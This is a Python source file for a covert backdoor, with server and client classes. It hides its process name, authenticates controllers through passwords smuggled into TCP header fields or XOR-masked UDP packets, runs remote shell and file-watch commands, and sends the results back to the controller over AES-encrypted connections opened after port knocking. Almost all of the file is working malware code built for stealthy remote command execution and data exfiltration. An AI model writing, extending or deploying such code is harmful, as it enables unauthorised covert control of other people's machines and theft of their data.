from __future__ import print_function
from scapy.all import *
from setproctitle import setproctitle, getproctitle
from threading import Thread

import binascii
import command
import Crypto.Cipher
import Queue
import random
import struct
import sys
import time
import traceback

PASSWORD_LEN=8

FIN = 0x01
SYN = 0x02
RST = 0x04
PSH = 0x08
ACK = 0x10
URG = 0x20
ECE = 0x40
CWR = 0x80

# result packet variables
PACKET_SIZE = 1024 # Total payload size for result packets (including our application-level headers)
FIRST_PACKET_PAYLOAD_MAX = PACKET_SIZE - 16 - 4 - 4 - 8
OTHER_PACKET_PAYLOAD_MAX = PACKET_SIZE - 8

# port knocking variables
KNOCKED_PORTS = [10000, 20000, 30000] # Until we add this as a config value, if ever

def make_iv():
    """Creates a 16-byte initialisation vector for AES encryption using the current time."""

    timestamp = time.time()

    # for the forseeable future, timestamp is representable in 4 bytes
    iv = struct.pack("<IIII", timestamp, timestamp, timestamp, timestamp)
    return iv

class BackdoorServer(object):

    def __init__(self, procname, aeskey, password, clientport):
        """Initialises a backdoor server with the given settings.
        
        Positional arguments:
        procname - the name with which to replace the current process's name. cannot contain spaces.
        aeskey   - a "secret" pre-shared key to use for AES encryption. the client and server will already know this key.
        password - a password to authenticate clients and ensure that decryption succeeded.
        clientport - The port on which the server will connect back to clients to send command results.
        """
        self.procname = procname
        self.aeskey = aeskey
        self.password = password
        self.client = None
        self.dport = clientport

    def mask_process(self):
        """Changes the process's name to self.procname to make it less conspicuous to people examining the process table."""
        setproctitle(self.procname)

    def recv(self):
        """Receives and returns bytes from the next packet sent from a connected client.
        
        Returns a bytes object containing the packet's payload.
        """
        raise NotImplementedError

    def listen(self):
        """Listens for a client and stores its IP address (as a string) in self.client on receiving a connection."""
        raise NotImplementedError

    def port_knock(self):
        """Knock on ports decided by user"""
        for port in KNOCKED_PORTS:
            send(IP(dst=self.client)/TCP(dport=port),verbose=0)
            time.sleep(0.2)
        

    def recv_command(self):
        """Receives and deserialises the next command from the connected client.
        
        Returns the received command as a Command object.
        """
        # Continue looping until we get a command
        # Ignore any packets that can't be decrypted or don't have the password in them
        while True:
            buf = self.recv()
            if len(buf) < 16:
                continue

            iv = buf[0:16]
            decryptor = Crypto.Cipher.AES.new(self.aeskey, Crypto.Cipher.AES.MODE_CBC, iv)
            decrypted = decryptor.decrypt(buf[16:])

            if len(decrypted) < PASSWORD_LEN + 1: # password length + command byte
                continue

            # We may have had to pad the payload for encryption; the size of the payload without
            # padding is stored in the first 4 bytes
            nopaddinglen = struct.unpack("<I", decrypted[0:4])[0]
            start = 4
            if decrypted[start:start+PASSWORD_LEN] == self.password:
                start += PASSWORD_LEN
                cmdbytes = decrypted[start:start+nopaddinglen]
                cmdtype = cmdbytes[0] if isinstance(cmdbytes[0], int) else ord(cmdbytes[0])

                if cmdtype == command.Command.SHELL:
                    cmd = command.ShellCommand.from_bytes(cmdbytes)
                elif cmdtype == command.Command.WATCH:
                    cmd = command.WatchCommand.from_bytes(cmdbytes)
                elif cmdtype == command.Command.END:
                    cmd = None
                else:
                    raise ValueError("Unknown command type {}".format(cmdtype))

                return cmd


    def result_queue(self, queue):
        while True:
            result = queue.get()
            self.send_result(result)
            queue.task_done()

    def send_result(self, result):
        """Sends the results of a command execution to the client.

        Positional arguments:
        result - A Result object containing the command's result.
        """

        retry_count = 1
        knock_wait_time = 1
        sock_timeout = 1

        covert_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        covert_sock.settimeout(sock_timeout)

        for i in range(0, retry_count):
            self.port_knock()
            time.sleep(knock_wait_time)
            connect_result = covert_sock.connect_ex((self.client, self.dport))
            if connect_result == 0:
                break

        if connect_result != 0:
            print("Client connection retries exceeded. Failed to send result.")
            return

        # First packet structure:
        # - 16 bytes: initialisation vector
        # - 4 bytes: random padding bytes for crypto alignment
        # - 4 bytes: length of entire result (i.e. len(result.to_bytes()))
        # - 8 bytes: password
        # - remaining bytes: result bytes; if length of result is < 996, extra space is filled with random bytes

        iv = make_iv()
        encryptor = Crypto.Cipher.AES.new(self.aeskey, Crypto.Cipher.AES.MODE_CBC, iv)

        start_padding = random.randrange(2147483647, 4294967295)

        result_bytes = result.to_bytes()
        result_len = len(result_bytes)

        payload = struct.pack("<I", start_padding)
        payload += struct.pack("<I", result_len)
        payload += self.password
        payload += result_bytes[:min(len(result_bytes), FIRST_PACKET_PAYLOAD_MAX)]
        if result_len < FIRST_PACKET_PAYLOAD_MAX:
            with open('/dev/random', 'r') as randfile:
                remainder = FIRST_PACKET_PAYLOAD_MAX - result_len
                payload += randfile.read(remainder)

        payload = encryptor.encrypt(payload)
        payload = iv + payload
    
        try:
            covert_sock.sendall(payload)
        except Exception, e:
            print("Exception while transmitting result: {}".format(str(e)))
            covert_sock.shutdown(socket.SHUT_RDWR)
            return

        if result_len > FIRST_PACKET_PAYLOAD_MAX:
            offset = FIRST_PACKET_PAYLOAD_MAX
            result_len -= FIRST_PACKET_PAYLOAD_MAX
            while result_len:
                # Subsequent packets (if the result didn't fit in the first one):
                # - 8 bytes: password
                # - remaining bytes: result bytes + random bytes if remaining result len is < 1016 bytes
                result_chunk_size = min(result_len, OTHER_PACKET_PAYLOAD_MAX)
                payload = self.password
                payload += result_bytes[offset:offset+result_chunk_size]

                if result_chunk_size < OTHER_PACKET_PAYLOAD_MAX:
                    with open('/dev/random', 'r') as randfile:
                        remainder = OTHER_PACKET_PAYLOAD_MAX - result_chunk_size
                        payload += randfile.read(remainder)

                payload = encryptor.encrypt(payload)

                try:
                    covert_sock.sendall(payload)
                except Exception, e:
                    print("Exception while transmitting result: {}".format(str(e)))
                    covert_sock.shutdown(socket.SHUT_RDWR)
                    return

                result_len -= result_chunk_size
                offset += result_chunk_size

        covert_sock.shutdown(socket.SHUT_RDWR)

    def run(self):
        """Runs in a loop listening for clients and serving their requests."""
        self.mask_process()

        queue = Queue.Queue(maxsize=0)

        while True:
            print("Waiting for client...")
            
            # TODO: Why is this a loop?
            while not self.client:
                self.listen()
            
            result_send = Thread(target=self.result_queue, args=(queue,))
            result_send.setDaemon(True)
            result_send.start()
            
            running_watch_command = None

            print("Client connected: {}".format(self.client))
            while True:
                try:
                    cmd = self.recv_command()
                    if not cmd:
                        print("{} disconnected.".format(self.client))
                        self.client = None
                        if running_watch_command:
                            running_watch_command.stop()

                        break

                    print(str(cmd))

                    if cmd.type == command.Command.SHELL:
                        cmd.run(queue)
                    elif cmd.type == command.Command.WATCH:
                        if running_watch_command:
                            print("Watch command is already running. Ignoring additional watch.")
                        else:
                            running_watch_command = command.WatchCommand.from_bytes(cmd.to_bytes())
                            def run_watch(queue):
                                running_watch_command.run(queue)

                            file_watch = Thread(target=run_watch, args=(queue,))
                            file_watch.setDaemon(True)
                            file_watch.start()

                except KeyboardInterrupt:
                    print("see ya")
                    sys.exit(0)

                except Exception, err:
                    traceback.print_exc()
                    break

class TcpBackdoorServer(BackdoorServer):

    def __init__(self, procname, aeskey, password, clientport, listenport):
        """Creates a new TcpBackdoorServer with the specified settings.
        
        Positional arguments:
        listenport - The port on which the backdoor server will listen for clients.
        """
        super(TcpBackdoorServer, self).__init__(procname, aeskey, password, clientport)
        self.lport = listenport

    def listen(self):
        # Create a new random source port from which to send
        self.sport = RandShort()
        print("entered the TCP Listen")
        # If MSS option + window size + ISN == the password and the traffic is bound for the correct port, we probably have a client
        def is_auth(packet):
            if len(packet["TCP"].options) == 0:
                return False

            mss = next((v for i, v in enumerate(packet["TCP"].options) if v[0] == "MSS"), None)
            if not mss:
                return False

            mss = mss[1] # Get the actual MSS value from the tuple

            window = packet["TCP"].window
            isn = packet["TCP"].seq

            pw = struct.pack("<HHI", mss, window, isn)
            if pw == self.password:
                self.client = packet["IP"].src
                return True
            else:
                return False

        bpf_filter = "tcp dst port {}".format(self.lport)
        sniff(filter=bpf_filter, stop_filter=is_auth)

    def recv(self):
        bpf_filter = "src host {} and tcp dst port {}".format(self.client, self.lport)
        pkts = sniff(filter=bpf_filter, count=1)

        return bytes(pkts[0]["TCP"].payload)

    def send(self, payload):
        # TODO: Remove this
        try:
            packet = IP(dst=self.client)\
                     / TCP(dport=self.dport, sport=self.sport, window=32768, flags=PSH|ACK)\
                     / Raw(load=payload)
            send(packet, verbose=0)
        except Exception, err:
            traceback.print_exc()
            sys.exit(1)

class UdpBackdoorServer(BackdoorServer):
    def __init__(self, procname, aeskey, password, clientport, listenport):
        """Creates a new UdpBackdoorServer with the specified settings.
        
        Positional arguments:
        listenport - The port on which the backdoor server will listen for clients.
        """
        super(UdpBackdoorServer, self).__init__(procname, aeskey, password, clientport)
        self.lport = listenport

    def listen(self):
        print("entered the UDP Listen")
        # If payload xor ((packet["UDP"].sport << 48) + (packet["UDP"].sport << 32) + (packet["UDP"].sport << 16) + (packet["UDP"].sport)) == pw, we have a client
        def is_auth(packet):

            if len(packet["UDP"].payload) != 18: #SCAPY BUG - PADDING 10 0s to the end
                return False
            temp_payload = bytes(packet["UDP"].payload)[:8]
            int_payload = struct.unpack("<Q", temp_payload)[0]
            xor_mask = (packet["UDP"].sport << 48) + (packet["UDP"].sport << 32) + (packet["UDP"].sport << 16) + (packet["UDP"].sport)
            pw = struct.pack("<Q", int_payload ^ xor_mask)

            if pw == self.password:
                self.client = packet["IP"].src
                return True
            else:
                return False

        bpf_filter = "udp dst port {}".format(self.lport)
        sniff(filter=bpf_filter, stop_filter=is_auth) #THIS SHOULDN"T BE SO STUPID

    def recv(self):
        bpf_filter = "src host {} and udp dst port {}".format(self.client, self.lport)
        pkts = sniff(filter=bpf_filter, count=1)

        return bytes(pkts[0]["UDP"].payload)

    def send(self, payload):
        # TODO: Remove this
        pass

class BackdoorClient(object):

    def __init__(self, aeskey, password):
        """Creates a new backdoor client with the specified AES key and password.
        
        Positional arguments:
        aeskey   - a "secret" pre-shared key for AES encryption.
        password - a password to authenticate clients and ensure that decryption succeeded.
        """
        self.aeskey = aeskey
        self.password = password

    def connect(self):
        """Connects to the backdoor server.

        This may silently fail if the protocol doesn't implement acknowledgments on connect.
        """
        raise NotImplementedError

    def send(self, payload):
        """Sends the bytes in payload to the server.
        
        Positional arguments:
        payload - A bytes object to send to the server.
        """
        raise NotImplementedError

    def send_command(self, command):
        """Sends a command to the server for remote execution or to signal the end of the connection.
        
        Positional arguments:
        command - A Command object that will be serialised, encrypted, and sent to the server.
        """
        iv = make_iv()
        encryptor = Crypto.Cipher.AES.new(self.aeskey, Crypto.Cipher.AES.MODE_CBC, iv)
        payload = self.password + command.to_bytes()
        payload = struct.pack("<I", len(payload)) + payload
        
        # blocks have to be padded to multiples of 16 bytes for AES
        remainder = len(payload) % Crypto.Cipher.AES.block_size
        if remainder:
            payload += '\0' * (Crypto.Cipher.AES.block_size - remainder)

        payload = encryptor.encrypt(payload)
        payload = iv + payload

        self.send(payload)

    def recv_result(self):
        """Receives the results of a command's execution from the server.

        Returns a Result object containing the command's result.
        """
        listen_timeout = 10
        listen_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listen_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listen_sock.settimeout(listen_timeout)
        listen_sock.bind(('', self.lport))
        listen_sock.listen(1)
        try:
            covert_sock, addr = listen_sock.accept()
        except Exception, e:
            print("Error while listening for server connection: {}".format(str(e)))
            return

        # First packet structure:
        # - 16 bytes: initialisation vector
        # - 4 bytes: random padding bytes for crypto alignment
        # - 4 bytes: length of entire result (i.e. len(result.to_bytes()))
        # - 8 bytes: password
        # - remaining bytes: result bytes; if length of result is < 996, extra space is filled with random bytes

        recv_timeout = 1
        covert_sock.settimeout(recv_timeout)
        try:
            first_packet = covert_sock.recv(PACKET_SIZE, socket.MSG_WAITALL)
        except Exception, e:
            print("Error while receiving result: {}".format(str(e)))
            return

        iv = first_packet[0:16]
        decryptor = Crypto.Cipher.AES.new(self.aeskey, Crypto.Cipher.AES.MODE_CBC, iv)

        payload = decryptor.decrypt(first_packet[16:])
        offset = 4 # Skip the padding bytes

        result_len = struct.unpack("<I", payload[offset:offset+4])[0]
        offset += 4

        password = payload[offset:offset+8]
        offset += 8

        # sanity check
        if password != self.password:
            print("Received bad result from server.")
            return

        if result_len <= FIRST_PACKET_PAYLOAD_MAX:
            result_bytes = payload[offset:offset+result_len]
        else:
            result_bytes = payload[offset:]
            result_len -= FIRST_PACKET_PAYLOAD_MAX

            while result_len:
                # Subsequent packets (if the result didn't fit in the first one):
                # - 8 bytes: password
                # - remaining bytes: result bytes + random bytes if remaining result len is < 1016 bytes
                result_chunk_size = min(result_len, OTHER_PACKET_PAYLOAD_MAX)

                try:
                    packet = covert_sock.recv(PACKET_SIZE, socket.MSG_WAITALL)
                except Exception, e:
                    print("Error while receiving result: {}".format(str(e)))
                    return

                payload = decryptor.decrypt(packet)
                if payload[0:8] != self.password:
                    print("Received bad result from server.")
                    return

                result_bytes += payload[8:8+result_chunk_size]
                result_len -= result_chunk_size

        result_type = ord(result_bytes[0])

        result = None

        if result_type == command.Command.SHELL:
            result = command.ShellCommand.Result.from_bytes(result_bytes)
        elif result_type == command.Command.WATCH:
            result = command.WatchCommand.Result.from_bytes(result_bytes)
        else:
            print("Unhandled result type {}".format(result_type))
        
        return result

    def listen_for_results(self):
        """ Open the TCP port and wait for the client to ping """
        while True:
            first_port = KNOCKED_PORTS[0]

            bpf_filter = "tcp dst port {}".format(first_port)
            pkts = sniff(filter=bpf_filter, count=1)

            knocker = pkts[0]["IP"].src

            for port in KNOCKED_PORTS[1:]:
                bpf_filter = "src host {} and tcp dst port {}".format(knocker, port)
                pkts = sniff(filter=bpf_filter, count=1, timeout=5)

            # if we timed out while waiting for one of the knocks, continue listening
            if not pkts:
                continue

            # should probably do a sanity check here as well to make sure that the server connecting to us is the same one that we configured via command line
            # TODO: add firewall rule allowing server to connect to lport
            result = self.recv_result()

            print("Received result:")
            print(str(result))
            # TODO: remove firewall exception
	
class TcpBackdoorClient(BackdoorClient):
    def __init__(self, aeskey, password, listenport, serverport, server):
        super(TcpBackdoorClient, self).__init__(aeskey, password)
        self.server = server
        self.lport = listenport
        self.dport = serverport

    def connect(self):
        # Insert the password into the packet so that the server can authenticate us
        mss, windowsize, isn = struct.unpack("<HHI", self.password)

        self.sport = RandShort()
        self.seq = isn

        try:
            connpacket = IP(dst=self.server) / TCP(dport=self.dport, sport=self.sport, window=windowsize, seq=isn, flags=SYN, options=[("MSS", mss)])
            send(connpacket, verbose=0)
        except Exception, err:
            traceback.print_exc()
            sys.exit(1)

    def send(self, payload):
        try:
            packet = IP(dst=self.server)\
                     / TCP(dport=self.dport, sport=self.sport, window=32768, seq=self.seq, flags=PSH|ACK)\
                     / Raw(load=payload)

            self.seq += len(payload)
            send(packet, verbose=0)
        except Exception, err:
            traceback.print_exc()
            sys.exit(1)

class UdpBackdoorClient(BackdoorClient):
    def __init__(self, aeskey, password, listenport, serverport, server):
        super(UdpBackdoorClient, self).__init__(aeskey, password)
        self.server = server
        self.lport = listenport
        self.dport = serverport

    def connect(self):
        # Insert the password into the packet so that the server can authenticate us
        self.sport = int(RandShort())
        xor_mask = (self.sport << 48) + (self.sport << 32) + (self.sport << 16) + self.sport
        masked_pw = struct.pack("<Q", struct.unpack("<Q", self.password)[0] ^ xor_mask)

        try:
            connpacket = IP(dst=self.server) / UDP(dport=self.dport, sport=self.sport) / masked_pw
            send(connpacket, verbose=0)
        except Exception, err:
            traceback.print_exc()
            sys.exit(1)

    def send(self, payload):
        try:
            packet = IP(dst=self.server)\
                     / UDP(dport=self.dport, sport=self.sport)\
                     / Raw(load=payload)

            send(packet, verbose=0)
        except Exception, err:
            traceback.print_exc()
            sys.exit(1)
